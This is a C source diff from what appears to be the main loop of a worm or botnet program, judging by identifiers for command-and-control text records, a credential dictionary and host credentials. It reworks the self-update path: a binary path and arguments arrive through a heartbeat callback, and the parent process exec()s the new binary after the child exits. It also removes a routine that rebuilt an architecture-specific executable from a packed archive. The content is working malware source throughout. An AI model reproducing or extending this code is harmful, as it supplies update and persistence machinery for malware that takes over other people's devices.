@@ -184,7 +184,7 @@ static char *cb_htbt_tmpfile (void *ctx, size_t req_size, const mode_t mode) {
 	return ret;
 }
 
-static bool cb_htbt_nybin (
+static bool cb_htbt_upbin (
 	void *ctx,
 	const char *path,
 	const prne_htbt_cmd_t *cmd)
@@ -192,14 +192,15 @@ static bool cb_htbt_nybin (
 	const size_t strsize = prne_nstrlen(path) + 1;
 
 	if (prne_s_g == NULL ||
-		strsize > sizeof(prne_s_g->ny_bin_path) ||
-		cmd->mem_len > sizeof(prne_s_g->ny_bin_args))
+		strsize > sizeof(prne_s_g->upbin_path) ||
+		cmd->mem_len > sizeof(prne_s_g->upbin_args))
 	{
 		errno = ENOMEM;
 		return false;
 	}
-	memcpy(prne_s_g->ny_bin_path, path, strsize);
-	memcpy(prne_s_g->ny_bin_args, cmd->mem, cmd->mem_len);
+	memcpy(prne_s_g->upbin_path, path, strsize);
+	prne_memzero(prne_s_g->upbin_args, sizeof(prne_s_g->upbin_args));
+	memcpy(prne_s_g->upbin_args, cmd->mem, cmd->mem_len);
 
 	pth_raise(prne_g.main_pth, SIGTERM);
 
@@ -224,7 +225,7 @@ static void alloc_htbt (void) {
 	param.cb_f.cnc_txtrec = cb_htbt_cnc_txtrec;
 	param.cb_f.hostinfo = cb_htbt_hostinfo;
 	param.cb_f.tmpfile = cb_htbt_tmpfile;
-	param.cb_f.ny_bin = cb_htbt_nybin;
+	param.cb_f.upbin = cb_htbt_upbin;
 	param.blackhole = prne_g.blackhole[1];
 
 	htbt = prne_alloc_htbt(
@@ -1023,7 +1024,7 @@ static bool init_shared_global (void) {
 
 	/*
 	* 1. Try creating shm, which is the most favourable
-	* 2. Try creating a file in /tmp, which is memory backed on most env
+	* 2. Try creating a file in /tmp, which is memory backed on most systems
 	* 3. Try creating a file in current wd
 	*
 	* ... just don't use shared memory if all of these fail
@@ -1075,7 +1076,8 @@ static bool init_shared_global (void) {
 	}
 	else {
 		// Session init code goes here
-		prne_s_g->ny_bin_path[0] = 0;
+		prne_memzero(prne_s_g->upbin_path, sizeof(prne_s_g->upbin_path));
+		prne_memzero(prne_s_g->upbin_args, sizeof(prne_s_g->upbin_args));
 	}
 
 END:
@@ -1134,86 +1136,6 @@ static void set_host_credential (const char *str) {
 		strlen(str));
 }
 
-static char *do_recombination (const uint8_t *m_nybin, const size_t nybin_len) {
-	uint8_t buf[4096];
-	char *exec = NULL, *ret = NULL;
-	const char *path;
-	prne_bin_archive_t ba;
-	prne_bin_rcb_ctx_t rcb;
-	const uint8_t *m_dv, *m_ba;
-	size_t dv_len, ba_len;
-	prne_pack_rc_t prc;
-	int fd = -1;
-	ssize_t f_ret;
-	size_t path_len;
-
-	prne_init_bin_archive(&ba);
-	prne_init_bin_rcb_ctx(&rcb);
-
-	if (!prne_index_nybin(m_nybin, nybin_len, &m_dv, &dv_len, &m_ba, &ba_len)) {
-		goto END;
-	}
-
-	prc = prne_index_bin_archive(m_ba, ba_len, &ba);
-	if (prc != PRNE_PACK_RC_OK) {
-		goto END;
-	}
-	prc = prne_start_bin_rcb(
-		&rcb,
-		prne_host_arch,
-		PRNE_ARCH_NONE,
-		NULL,
-		0,
-		0,
-		m_dv,
-		dv_len,
-		&ba);
-	if (prc != PRNE_PACK_RC_OK) {
-		goto END;
-	}
-
-	path = prne_dvault_get_cstr(PRNE_DATA_KEY_EXEC_NAME, &path_len);
-	exec = prne_alloc_str(path_len);
-	if (exec == NULL) {
-		goto END;
-	}
-	strcpy(exec, path);
-	prne_dvault_reset();
-	fd = open(
-		exec,
-		O_WRONLY | O_CREAT | O_TRUNC,
-		0700);
-	if (fd < 0) {
-		goto END;
-	}
-	chmod(exec, 0700);
-
-	do {
-		f_ret = prne_bin_rcb_read(&rcb, buf, sizeof(buf), &prc, NULL);
-		if (f_ret < 0) {
-			goto END;
-		}
-		if (f_ret > 0 && write(fd, buf, f_ret) != f_ret) {
-			goto END;
-		}
-	} while (prc != PRNE_PACK_RC_EOF);
-
-	ret = exec;
-	exec = NULL;
-
-END:
-	prne_dvault_reset();
-	if (exec != NULL && fd > 0) {
-		unlink(exec);
-	}
-	prne_free(exec);
-	prne_free_bin_archive(&ba);
-	prne_free_bin_rcb_ctx(&rcb);
-	prne_close(fd);
-
-	return ret;
-}
-
 static void do_exec (const char *exec, char **args) {
 	sigset_t ss, old_ss;
 	bool has_ss;
@@ -1236,48 +1158,22 @@ static void do_exec (const char *exec, char **args) {
 	init_shared_global();
 }
 
-static void run_ny_bin (void) {
-	const uint8_t *m_nybin = NULL;
-	size_t nybin_len = 0;
-	off_t ofs;
-	int fd = -1;
+static void run_upbin (void) {
 	char **args = NULL;
 	char *add_args[1] = { NULL };
+	char *m_args = NULL;
 
-	fd = open(prne_s_g->ny_bin_path, O_RDONLY);
-	unlink(prne_s_g->ny_bin_path);
-	prne_s_g->ny_bin_path[0] = 0;
-	if (fd < 0) {
+	// copy data from shared global as it will be unmapped before exec() call.
+	add_args[0] = prne_dup_str(prne_s_g->upbin_path);
+	m_args = prne_malloc(1, sizeof(prne_s_g->upbin_args));
+	if (add_args[0] == NULL || m_args == NULL) {
 		goto END;
 	}
-	ofs = lseek(fd, 0, SEEK_END);
-	if (ofs < 0) {
-		goto END;
-	}
-	nybin_len = (size_t)ofs;
+	memcpy(m_args, prne_s_g->upbin_args, sizeof(prne_s_g->upbin_args));
 
-	m_nybin = (const uint8_t*)mmap(
-		NULL,
-		nybin_len,
-		PROT_READ,
-		MAP_SHARED,
-		fd,
-		0);
-	close(fd);
-	fd = -1;
-	if (m_nybin == MAP_FAILED) {
-		m_nybin = NULL;
-		goto END;
-	}
-	add_args[0] = do_recombination(m_nybin, nybin_len);
-	if (add_args[0] == NULL) {
-		goto END;
-	}
-
-	add_args[0] = add_args[0];
 	args = prne_htbt_parse_args(
-		prne_s_g->ny_bin_args,
-		sizeof(prne_s_g->ny_bin_args),
+		m_args,
+		sizeof(prne_s_g->upbin_args),
 		1,
 		add_args,
 		NULL,
@@ -1285,17 +1181,12 @@ static void run_ny_bin (void) {
 	if (args == NULL) {
 		goto END;
 	}
+
 	do_exec(args[0], args);
 
 END:
-	prne_close(fd);
-	if (m_nybin != NULL) {
-		munmap((void*)m_nybin, nybin_len);
-	}
-	if (add_args[0] != NULL) {
-		unlink(add_args[0]);
-		prne_free(add_args[0]);
-	}
+	prne_free(add_args[0]);
+	prne_free(m_args);
 	prne_free(args);
 }
 
@@ -1366,6 +1257,10 @@ static void deinit_bne (void) {
 	prne_free_llist(&bne_list);
 	prne_free_cred_dict(&prne_g.cred_dict);
 	prne_free_bne_param(&bne_param);
+}
+
+static bool has_upbin (void) {
+	return prne_s_g != NULL && strlen(prne_s_g->upbin_path) > 0;
 }
 
 
@@ -1451,7 +1346,6 @@ int main (const int argc, const char **args) {
 			static int status, caught_signal;
 			static pid_t f_ret;
 			static sigset_t ss;
-			static bool has_ny_bin;
 
 			prne_dbgpf("* Child: %d\n", prne_g.child_pid);
 
@@ -1477,8 +1371,6 @@ WAIT_LOOP:
 			}
 
 			if (prne_s_g != NULL) {
-				has_ny_bin = strlen(prne_s_g->ny_bin_path) > 0;
-
 				if (!(WIFEXITED(status) && WEXITSTATUS(status) == 0)) {
 					prne_s_g->crash_cnt += 1;
 				}
@@ -1490,12 +1382,13 @@ WAIT_LOOP:
 					prne_g.child_pid,
 					WEXITSTATUS(status));
 				if (WEXITSTATUS(status) == 0) {
-					if (has_ny_bin) {
+					if (has_upbin()) {
 						prne_dbgpf(
-							"* Detected new bin. "
-							"Attempting to exec()\n");
-						run_ny_bin();
-						// run_ny_bin() returns if fails
+							"* Detected new bin: %s\n"
+							"Attempting to exec()\n",
+							prne_s_g->upbin_path);
+						run_upbin();
+						// run_upbin() returns if fails
 					}
 					else {
 						break;
@@ -1509,9 +1402,9 @@ WAIT_LOOP:
 					WTERMSIG(status));
 			}
 
-			if (has_ny_bin) {
-				unlink(prne_s_g->ny_bin_path);
-				prne_s_g->ny_bin_path[0] = 0;
+			if (has_upbin()) {
+				unlink(prne_s_g->upbin_path);
+				prne_s_g->upbin_path[0] = 0;
 			}
 
 			sleep(1);
